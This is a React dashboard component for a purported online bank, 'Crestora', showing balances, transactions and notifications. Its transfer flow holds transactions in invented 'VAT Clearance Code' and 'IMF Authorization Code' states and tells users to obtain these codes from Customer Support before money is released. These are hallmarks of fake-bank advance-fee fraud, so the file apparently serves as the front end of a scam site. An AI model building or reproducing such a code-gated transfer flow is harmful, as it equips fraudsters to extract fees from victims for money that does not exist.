import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Skeleton } from '@/components/ui/skeleton';
import { Input } from '@/components/ui/input';
import {
  Popover, PopoverContent, PopoverTrigger,
} from '@/components/ui/popover';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Avatar, AvatarFallback, AvatarImage } from '@/components/ui/avatar';
import { useLocation } from 'wouter';
import { useState, useEffect } from 'react';
import { useAuth } from '@/_core/hooks/useAuth';
import { trpc } from '@/lib/trpc';
import { toast } from 'sonner';
import {
  ArrowUpRight, ArrowDownLeft, Bell, CreditCard, FileText,
  Headphones, Landmark, LogOut, Receipt, Send, Settings as SettingsIcon,
  ShieldCheck, Wallet, Eye, EyeOff, PiggyBank, Globe, KeyRound, AlertTriangle,
} from 'lucide-react';

function getGreeting(): string {
  const h = new Date().getHours();
  if (h < 12) return 'Good Morning';
  if (h < 17) return 'Good Afternoon';
  return 'Good Evening';
}

function maskAccountNumber(acct?: string | null): string {
  if (!acct) return '•••• ••••';
  return `•••• ${acct.slice(-4)}`;
}

function fmtCurrency(n: number | string, currency = 'USD'): string {
  const val = typeof n === 'string' ? parseFloat(n) : n;
  try {
    return new Intl.NumberFormat(undefined, { style: 'currency', currency }).format(val);
  } catch {
    return `${currency} ${val.toFixed(2)}`;
  }
}

const statusStyles: Record<string, string> = {
  pending: 'bg-amber-100 text-amber-700',
  approved: 'bg-blue-100 text-blue-700',
  completed: 'bg-emerald-100 text-emerald-700',
  failed: 'bg-red-100 text-red-700',
  'on-hold': 'bg-orange-100 text-orange-700',
  reversed: 'bg-purple-100 text-purple-700',
  processing: 'bg-sky-100 text-sky-700',
  pending_vat: 'bg-amber-100 text-amber-800',
  pending_imf: 'bg-amber-100 text-amber-800',
};

const statusLabels: Record<string, string> = {
  pending_vat: 'VAT Code Required',
  pending_imf: 'IMF Code Required',
};

function TxIcon({ type }: { type: string }) {
  const cls = 'h-5 w-5';
  if (type === 'funding' || type === 'deposit') return <ArrowDownLeft className={`${cls} text-emerald-600`} />;
  if (type === 'withdrawal') return <ArrowUpRight className={`${cls} text-red-500`} />;
  return <Send className={`${cls} text-blue-600`} />;
}

export default function Dashboard() {
  const { user, loading, logout } = useAuth();
  const [, setLocation] = useLocation();
  const [showBalance, setShowBalance] = useState(true);
  const [selectedTx, setSelectedTx] = useState<any>(null);
  const [verifyCode, setVerifyCode] = useState('');
  const utils = trpc.useUtils();

  const accountQuery = trpc.account.me.useQuery(undefined, {
    enabled: Boolean(user), retry: false, refetchOnWindowFocus: false,
  });
  const txQuery = trpc.account.transactions.useQuery(undefined, {
    enabled: Boolean(user), retry: false, refetchOnWindowFocus: false,
  });
  const notifQuery = trpc.account.notifications.useQuery(undefined, {
    enabled: Boolean(user), retry: false, refetchOnWindowFocus: false,
  });
  const markRead = trpc.account.markNotificationsRead.useMutation({
    onSuccess: () => utils.account.notifications.invalidate(),
  });

  const updateAvatar = trpc.auth.updateAvatar.useMutation({
    onSuccess: () => {
      utils.account.me.invalidate();
      toast.success('Profile picture updated');
    },
    onError: () => toast.error('Failed to update profile picture'),
  });

  const handleAvatarUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (!file.type.startsWith('image/')) {
      toast.error('Please select an image file');
      return;
    }
    const formData = new FormData();
    formData.append('file', file);
    try {
      const res = await fetch('/api/upload', { method: 'POST', body: formData });
      const data = await res.json();
      if (data.url) {
        updateAvatar.mutate({ avatarUrl: data.url });
      } else {
        toast.error('Upload failed');
      }
    } catch {
      toast.error('Upload failed');
    }
  };

  const submitVat = trpc.verification.submitVatCode.useMutation({
    onSuccess: (res) => {
      toast.success(res.message || 'VAT code verified');
      setVerifyCode('');
      setSelectedTx(null);
      utils.account.transactions.invalidate();
      utils.account.notifications.invalidate();
    },
    onError: (err) => toast.error(err.message || 'Invalid code'),
  });
  const submitImf = trpc.verification.submitImfCode.useMutation({
    onSuccess: (res) => {
      toast.success(res.message || 'IMF code verified');
      setVerifyCode('');
      setSelectedTx(null);
      utils.account.transactions.invalidate();
      utils.account.notifications.invalidate();
    },
    onError: (err) => toast.error(err.message || 'Invalid code'),
  });
  const isVerifying = submitVat.isPending || submitImf.isPending;

  const handleSubmitCode = (tx: any) => {
    if (!verifyCode.trim()) {
      toast.error('Please enter your verification code');
      return;
    }
    if (tx.status === 'pending_vat') {
      submitVat.mutate({ transactionId: tx.id, code: verifyCode.trim() });
    } else if (tx.status === 'pending_imf') {
      submitImf.mutate({ transactionId: tx.id, code: verifyCode.trim() });
    }
  };

  const account = accountQuery.data;
  const balance = account ? parseFloat(account.balance as string) : 0;
  const unreadCount = (notifQuery.data || []).filter((n: any) => !n.isRead).length;
  const verificationTxs = (txQuery.data || []).filter(
    (t: any) => t.status === 'pending_vat' || t.status === 'pending_imf'
  );

  useEffect(() => {
    if (!loading && !user) setLocation('/login');
  }, [loading, user, setLocation]);

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 p-8 space-y-4">
        <Skeleton className="h-10 w-64" />
        <Skeleton className="h-48 w-full rounded-2xl" />
        <Skeleton className="h-32 w-full rounded-2xl" />
      </div>
    );
  }
  if (!user) return null;

  const fullName = account ? `${account.firstName || ''} ${account.lastName || ''}`.trim() : (user.name || 'Customer');
  const firstName = account?.firstName || (user.name || 'Customer').split(' ')[0];

  const quickActions = [
    { label: 'Transfer', icon: Send, onClick: () => setLocation('/transfer-method'), primary: true },
    { label: 'Deposit', icon: PiggyBank, onClick: () => setLocation('/deposit') },
    { label: 'Pay Bills', icon: Receipt, onClick: () => setLocation('/pay-bills') },
    { label: 'Cards', icon: CreditCard, onClick: () => setLocation('/credit-card') },
    { label: 'Loans', icon: Landmark, onClick: () => setLocation('/my-loans') },
    { label: 'Statements', icon: FileText, onClick: () => setLocation('/statements') },
  ];

  return (
    <div className="min-h-screen bg-slate-50">
      {/* Top Navigation */}
      <nav className="bg-white/80 backdrop-blur-md border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
              <div className="h-10 w-10 rounded-xl bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center shrink-0">
                <Landmark className="h-5 w-5 text-white" />
              </div>
              <span className="text-2xl font-bold text-slate-900">Crestora</span>
            </div>
          <div className="flex items-center gap-2">
            <Popover>
              <PopoverTrigger asChild>
                <Button
                  variant="ghost" size="icon" className="relative"
                  onClick={() => { if (unreadCount > 0) markRead.mutate(); }}
                >
                  <Bell className="h-5 w-5 text-slate-600" />
                  {unreadCount > 0 && (
                    <span className="absolute -top-0.5 -right-0.5 h-4 min-w-4 px-1 rounded-full bg-red-500 text-white text-[10px] font-bold flex items-center justify-center">
                      {unreadCount}
                    </span>
                  )}
                </Button>
              </PopoverTrigger>
              <PopoverContent align="end" className="w-80 p-0 bg-white">
                <div className="p-3 border-b border-slate-100 font-semibold text-slate-900">Notifications</div>
                <div className="max-h-80 overflow-y-auto">
                  {(notifQuery.data || []).length === 0 ? (
                    <p className="p-4 text-sm text-slate-500 text-center">No notifications yet</p>
                  ) : (
                    (notifQuery.data || []).map((n: any) => (
                      <div key={n.id} className="p-3 border-b border-slate-50 hover:bg-slate-50">
                        <div className="flex items-center gap-2">
                          {!n.isRead && <span className="h-2 w-2 rounded-full bg-blue-500 shrink-0" />}
                          <p className="text-sm font-semibold text-slate-900">{n.title}</p>
                        </div>
                        <p className="text-xs text-slate-600 mt-1">{n.message}</p>
                        <p className="text-[11px] text-slate-400 mt-1">{new Date(n.createdAt).toLocaleString()}</p>
                      </div>
                    ))
                  )}
                </div>
              </PopoverContent>
            </Popover>
            <div className="relative shrink-0" title="Upload profile picture">
              <Avatar className="h-9 w-9 border border-slate-200 cursor-pointer">
                <AvatarImage src={account?.avatarUrl || undefined} className="object-cover" />
                <AvatarFallback className="text-xs font-semibold bg-blue-100 text-blue-700">
                  {(firstName || 'U').charAt(0).toUpperCase()}
                </AvatarFallback>
              </Avatar>
              <input
                type="file"
                accept="image/*"
                className="absolute inset-0 h-9 w-9 max-w-9 max-h-9 opacity-0 cursor-pointer"
                onChange={handleAvatarUpload}
              />
            </div>
            <Button variant="ghost" size="icon" className="relative z-10" onClick={() => setLocation('/settings')} title="Settings">
              <SettingsIcon className="h-5 w-5 text-slate-600" />
            </Button>
            <Button variant="ghost" size="icon" className="relative z-10" onClick={logout} title="Logout">
              <LogOut className="h-5 w-5 text-slate-600" />
            </Button>
          </div>
        </div>
      </nav>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8">
        {/* Greeting */}
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">{getGreeting()}, {firstName}</h1>
          <p className="text-slate-500 mt-1">{fullName}</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Balance Card */}
          <Card className="lg:col-span-2 p-0 overflow-hidden border-0 shadow-lg rounded-2xl">
            <div className="bg-gradient-to-br from-blue-700 via-blue-800 to-slate-900 p-6 sm:p-8 text-white relative">
              <div className="absolute top-0 right-0 w-64 h-64 bg-white/5 rounded-full -translate-y-1/2 translate-x-1/3" />
              <div className="flex items-center justify-between mb-6 relative">
                <div className="flex items-center gap-2 text-blue-200 text-sm">
                  <Wallet className="h-4 w-4" />
                  Available Balance
                </div>
                <button
                  onClick={() => setShowBalance(!showBalance)}
                  className="text-blue-200 hover:text-white transition"
                >
                  {showBalance ? <Eye className="h-4 w-4" /> : <EyeOff className="h-4 w-4" />}
                </button>
              </div>
              <p className="text-4xl sm:text-5xl font-bold tracking-tight relative">
                {showBalance
                  ? `$${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                  : '••••••'}
              </p>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mt-8 relative">
                <div>
                  <p className="text-blue-300 text-xs mb-1">Current Balance</p>
                  <p className="font-semibold text-sm">
                    {showBalance ? `$${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}` : '••••'}
                  </p>
                </div>
                <div>
                  <p className="text-blue-300 text-xs mb-1">Account Number</p>
                  <p className="font-semibold text-sm font-mono">{maskAccountNumber(account?.accountNumber)}</p>
                </div>
                <div>
                  <p className="text-blue-300 text-xs mb-1">Account Type</p>
                  <p className="font-semibold text-sm">Premium Checking</p>
                </div>
                <div>
                  <p className="text-blue-300 text-xs mb-1">Status</p>
                  <p className="font-semibold text-sm flex items-center gap-1">
                    <ShieldCheck className={`h-3.5 w-3.5 ${account?.status === 'frozen' ? 'text-sky-300' : account?.status === 'inactive' ? 'text-red-300' : 'text-emerald-400'}`} />
                    {account?.status === 'approved' ? 'Active' : account?.status === 'frozen' ? 'Frozen' : account?.status === 'inactive' ? 'Inactive' : 'Pending Approval'}
                  </p>
                </div>
              </div>
            </div>
          </Card>

          {/* Quick Actions */}
          <Card className="p-6 border-0 shadow-sm rounded-2xl bg-white">
            <h3 className="text-sm font-semibold text-slate-500 uppercase tracking-wide mb-4">Quick Actions</h3>
            <div className="grid grid-cols-3 gap-3">
              {quickActions.map((action) => (
                <button
                  key={action.label}
                  onClick={action.onClick}
                  className={`flex flex-col items-center gap-2 p-3 rounded-xl transition-all duration-150 active:scale-95 ${
                    action.primary
                      ? 'bg-blue-600 text-white hover:bg-blue-700 shadow-md shadow-blue-600/20'
                      : 'bg-slate-50 text-slate-700 hover:bg-slate-100'
                  }`}
                >
                  <action.icon className="h-5 w-5" />
                  <span className="text-xs font-medium">{action.label}</span>
                </button>
              ))}
            </div>
          </Card>
        </div>

        {/* KYC required banner */}
        {account && account.kycStatus !== 'approved' && (
          <div className="mt-6 bg-amber-50 border border-amber-200 rounded-xl p-4 flex items-start gap-3">
            <AlertTriangle className="h-5 w-5 text-amber-600 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-semibold text-amber-800">Account verification required</p>
              <p className="text-sm text-amber-700">Please complete your identity verification (KYC) in Settings to unlock transfers and full account features.</p>
            </div>
          </div>
        )}

        {/* Account pending banner */}
        {account && account.status !== 'approved' && (
          <div className="mt-6 bg-amber-50 border border-amber-200 rounded-xl p-4 flex items-start gap-3">
            <ShieldCheck className="h-5 w-5 text-amber-600 mt-0.5 shrink-0" />
            <div>
              <p className="text-sm font-semibold text-amber-800">Account awaiting approval</p>
              <p className="text-sm text-amber-700">Your account is under review. You'll receive an email once it's approved — usually within a few hours.</p>
            </div>
          </div>
        )}

        {/* Verification required banner */}
        {verificationTxs.length > 0 && (
          <div className="mt-6 bg-amber-50 border-2 border-amber-300 rounded-xl p-4 sm:p-5">
            <div className="flex items-start gap-3">
              <div className="h-10 w-10 rounded-full bg-amber-100 flex items-center justify-center shrink-0">
                <KeyRound className="h-5 w-5 text-amber-700" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-bold text-amber-900">
                  Action Required: Transfer Verification Pending
                </p>
                <p className="text-sm text-amber-800 mt-0.5">
                  {verificationTxs.length === 1
                    ? `Your transfer ${verificationTxs[0].reference || ''} requires ${verificationTxs[0].status === 'pending_vat' ? 'a VAT Clearance Code' : 'an IMF Authorization Code'} to continue processing.`
                    : `${verificationTxs.length} of your transfers require a verification code to continue processing.`}
                  {' '}Contact Customer Support to obtain your code, then enter it below.
                </p>
                <div className="flex flex-wrap gap-2 mt-3">
                  {verificationTxs.map((tx: any) => (
                    <Button
                      key={tx.id}
                      size="sm"
                      className="bg-amber-600 hover:bg-amber-700 text-white"
                      onClick={() => { setVerifyCode(''); setSelectedTx(tx); }}
                    >
                      Enter {tx.status === 'pending_vat' ? 'VAT' : 'IMF'} Code
                      {tx.reference ? ` · ${tx.reference}` : ''}
                    </Button>
                  ))}
                  <Button size="sm" variant="outline" className="border-amber-300 text-amber-800 hover:bg-amber-100"
                    onClick={() => setLocation('/support')}>
                    <Headphones className="h-3.5 w-3.5 mr-1.5" /> Contact Support
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Transaction History */}
        <Card className="mt-6 p-6 border-0 shadow-sm rounded-2xl bg-white">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-lg font-bold text-slate-900">Transaction History</h3>
          </div>
          {txQuery.isLoading ? (
            <div className="space-y-3">
              <Skeleton className="h-14 w-full rounded-xl" />
              <Skeleton className="h-14 w-full rounded-xl" />
            </div>
          ) : txQuery.data && txQuery.data.length > 0 ? (
            <div className="divide-y divide-slate-100">
              {txQuery.data.map((tx: any) => (
                <div key={tx.id} className="py-3.5 flex items-center gap-4 cursor-pointer hover:bg-slate-50 px-2 -mx-2 rounded-lg transition-colors" onClick={() => setSelectedTx(tx)}>
                  <div className={`h-10 w-10 rounded-full flex items-center justify-center shrink-0 ${
                    tx.type === 'funding' || tx.type === 'deposit' ? 'bg-emerald-50' : tx.type === 'withdrawal' ? 'bg-red-50' : 'bg-blue-50'
                  }`}>
                    <TxIcon type={tx.type} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-slate-900 truncate">
                      {tx.type === 'funding' ? 'Account Credit' :
                       tx.type === 'transfer' ? `Transfer to ${tx.recipientName || 'Recipient'}` :
                       tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}
                    </p>
                    <p className="text-xs text-slate-500">
                      {new Date(tx.createdAt).toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' })}
                      {' · '}
                      {new Date(tx.createdAt).toLocaleTimeString(undefined, { hour: 'numeric', minute: '2-digit' })}
                      {tx.reference ? ` · ${tx.reference}` : ''}
                    </p>
                  </div>
                  <div className="text-right shrink-0">
                    <p className={`text-sm font-bold ${
                      tx.type === 'funding' || tx.type === 'deposit' ? 'text-emerald-600' : 'text-slate-900'
                    }`}>
                      {tx.type === 'funding' || tx.type === 'deposit' ? '+' : '−'}
                      {fmtCurrency(tx.amount, tx.currency || 'USD')}
                    </p>
                    <span className={`inline-block mt-0.5 px-2 py-0.5 rounded-full text-[11px] font-semibold capitalize ${statusStyles[tx.status] || 'bg-slate-100 text-slate-600'}`}>
                      {statusLabels[tx.status] || tx.status}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="text-center py-12">
              <div className="h-14 w-14 rounded-full bg-slate-100 flex items-center justify-center mx-auto mb-3">
                <Receipt className="h-6 w-6 text-slate-400" />
              </div>
              <p className="text-slate-600 font-medium">No transactions yet</p>
              <p className="text-sm text-slate-400 mt-1">Your activity will appear here</p>
            </div>
          )}
        </Card>

        {/* Transaction Details Dialog */}
        <Dialog open={!!selectedTx} onOpenChange={(open) => !open && setSelectedTx(null)}>
          <DialogContent className="sm:max-w-md max-h-[85vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle>Transaction Details</DialogTitle>
            </DialogHeader>
            {selectedTx && (
              <div className="space-y-4 mt-1">
                <div className="flex justify-between items-center bg-slate-50 p-4 rounded-xl">
                  <div>
                    <p className="text-xs text-slate-500">Amount</p>
                    <p className="text-2xl font-bold text-slate-900">{fmtCurrency(selectedTx.amount, selectedTx.currency || 'USD')}</p>
                  </div>
                  <span className={`inline-block px-3 py-1 rounded-full text-xs font-bold capitalize ${statusStyles[selectedTx.status] || 'bg-slate-100 text-slate-600'}`}>
                    {statusLabels[selectedTx.status] || selectedTx.status}
                  </span>
                </div>

                <div className="space-y-2.5 text-sm">
                  {selectedTx.reference && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500 shrink-0">Reference</span>
                      <span className="font-mono font-medium text-slate-900 text-right">{selectedTx.reference}</span>
                    </div>
                  )}
                  <div className="flex justify-between gap-4">
                    <span className="text-slate-500">Type</span>
                    <span className="font-medium text-slate-900 capitalize">
                      {selectedTx.type}{selectedTx.transferType ? ` · ${selectedTx.transferType}` : ''}
                    </span>
                  </div>
                  <div className="flex justify-between gap-4">
                    <span className="text-slate-500">Date & Time</span>
                    <span className="font-medium text-slate-900">{new Date(selectedTx.createdAt).toLocaleString()}</span>
                  </div>
                  {selectedTx.recipientName && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500">Recipient</span>
                      <span className="font-medium text-slate-900">{selectedTx.recipientName}</span>
                    </div>
                  )}
                  {selectedTx.recipientBank && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500">Recipient Bank</span>
                      <span className="font-medium text-slate-900">{selectedTx.recipientBank}</span>
                    </div>
                  )}
                  {selectedTx.transferMethod && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500">Method</span>
                      <span className="font-medium text-slate-900 capitalize">
                        {selectedTx.transferMethod === 'cashapp' ? 'Cash App' : selectedTx.transferMethod}
                        {selectedTx.methodDetail ? ` · ${selectedTx.methodDetail}` : ''}
                      </span>
                    </div>
                  )}
                  {selectedTx.recipientAccount && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500">Recipient Account</span>
                      <span className="font-mono text-slate-900">{selectedTx.recipientAccount}</span>
                    </div>
                  )}
                  {selectedTx.description && (
                    <div className="flex justify-between gap-4">
                      <span className="text-slate-500 shrink-0">Description</span>
                      <span className="font-medium text-slate-900 text-right">{selectedTx.description}</span>
                    </div>
                  )}
                </div>

                {selectedTx.recipientCurrency && selectedTx.exchangeRate && (
                  <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 space-y-2 text-sm">
                    <p className="text-[11px] font-bold uppercase tracking-wider text-blue-700 flex items-center gap-1.5">
                      <Globe className="h-3.5 w-3.5" /> Currency Conversion
                    </p>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Exchange Rate</span>
                      <span className="font-medium text-slate-900">
                        1 {selectedTx.currency} = {parseFloat(selectedTx.exchangeRate).toFixed(4)} {selectedTx.recipientCurrency}
                      </span>
                    </div>
                    {parseFloat(selectedTx.transferFee || '0') > 0 && (
                      <div className="flex justify-between">
                        <span className="text-slate-500">Transfer Fee</span>
                        <span className="font-medium text-slate-900">{fmtCurrency(selectedTx.transferFee, selectedTx.currency || 'USD')}</span>
                      </div>
                    )}
                    <div className="flex justify-between border-t border-blue-100 pt-2">
                      <span className="text-slate-500">Recipient Receives</span>
                      <span className="font-bold text-blue-900">{fmtCurrency(selectedTx.recipientAmount, selectedTx.recipientCurrency)}</span>
                    </div>
                  </div>
                )}

                {selectedTx.status === 'on-hold' && (
                  <div className="bg-orange-50 border border-orange-200 rounded-xl p-4 space-y-2 text-sm">
                    <p className="text-[11px] font-bold uppercase tracking-wider text-orange-800 flex items-center gap-1.5">
                      <ShieldCheck className="h-3.5 w-3.5" /> Under Review — ITRT
                    </p>
                    {selectedTx.reviewCaseId && (
                      <div className="flex justify-between">
                        <span className="text-orange-700">Case ID</span>
                        <span className="font-mono font-bold text-orange-900">{selectedTx.reviewCaseId}</span>
                      </div>
                    )}
                    {selectedTx.holdReason && (
                      <div className="flex justify-between gap-4">
                        <span className="text-orange-700 shrink-0">Reason</span>
                        <span className="font-medium text-orange-900 text-right">{selectedTx.holdReason}</span>
                      </div>
                    )}
                    <div className="flex justify-between">
                      <span className="text-orange-700">Estimated Time</span>
                      <span className="font-medium text-orange-900">{selectedTx.estimatedReviewTime || '24-48 hours'}</span>
                    </div>
                    <p className="text-xs text-orange-700 pt-1">
                      Your transfer is being reviewed by our International Transfer Review Team. You'll be notified by email once the review is complete.
                    </p>
                  </div>
                )}

                {(selectedTx.status === 'pending_vat' || selectedTx.status === 'pending_imf') && (
                  <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 space-y-3 text-sm">
                    <p className="text-[11px] font-bold uppercase tracking-wider text-amber-800 flex items-center gap-1.5">
                      <KeyRound className="h-3.5 w-3.5" />
                      {selectedTx.status === 'pending_vat' ? 'VAT Clearance Code Required' : 'IMF Authorization Code Required'}
                    </p>
                    <p className="text-xs text-amber-800 leading-relaxed">
                      {selectedTx.status === 'pending_vat'
                        ? 'This transfer requires a VAT (Value Added Tax) Clearance Code before it can proceed. Please contact Customer Support to obtain your code, then enter it below.'
                        : 'This transfer requires an IMF (International Monetary Fund) Authorization Code before it can be released for settlement. Please contact Customer Support to obtain your code, then enter it below.'}
                    </p>
                    <div className="flex gap-2">
                      <Input
                        value={verifyCode}
                        onChange={(e) => setVerifyCode(e.target.value.toUpperCase())}
                        placeholder={selectedTx.status === 'pending_vat' ? 'Enter VAT code' : 'Enter IMF code'}
                        className="font-mono bg-white"
                        disabled={isVerifying}
                        onKeyDown={(e) => { if (e.key === 'Enter') handleSubmitCode(selectedTx); }}
                      />
                      <Button
                        className="bg-amber-600 hover:bg-amber-700 text-white shrink-0"
                        disabled={isVerifying}
                        onClick={() => handleSubmitCode(selectedTx)}
                      >
                        {isVerifying ? 'Verifying…' : 'Verify'}
                      </Button>
                    </div>
                    <button
                      className="text-xs text-amber-700 underline underline-offset-2 flex items-center gap-1"
                      onClick={() => { setSelectedTx(null); setLocation('/support'); }}
                    >
                      <AlertTriangle className="h-3 w-3" /> Don't have a code? Contact Customer Support
                    </button>
                  </div>
                )}
              </div>
            )}
          </DialogContent>
        </Dialog>
      </main>
    </div>
  );
}
